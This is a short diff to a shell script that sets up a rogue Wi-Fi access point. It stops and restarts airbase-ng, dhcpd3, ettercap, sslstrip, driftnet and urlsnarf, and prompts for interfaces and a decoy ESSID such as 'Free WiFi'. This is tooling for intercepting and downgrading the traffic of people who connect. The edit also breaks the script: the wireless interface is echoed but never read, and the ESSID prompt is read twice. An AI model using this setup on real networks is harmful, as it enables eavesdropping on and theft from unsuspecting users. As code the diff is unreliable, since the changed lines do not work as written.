@@ -8,12 +8,10 @@ killall -9 dhcpd3 airbase-ng ettercap sslstrip driftnet urlsnarf tail
 # Kill all dchp processes
 kill `cat /var/run/dhcp3-server/dhcpd.pid`
 
-echo -n "Enter the name of the interface connected to the internet, for example eth0: "
-read -e IFACE
+read -p "Enter the name of the interface connected to the internet, for example eth0: " IFACE
 airmon-ng
-echo -n "Enter your wireless interface name, for example wlan0: "
-read -e WIFACE
-echo -n "Enter the ESSID you would like your rogue AP to be called, for example Free WiFi: "
+echo -n "Enter your wireless interface name, for example wlan0: " WIFACE
+read -p "Enter the ESSID you would like your rogue AP to be called, for example Free WiFi: "
 read -e ESSID
 # Stop and bring down the wireless interface
 airmon-ng stop $WIFACE
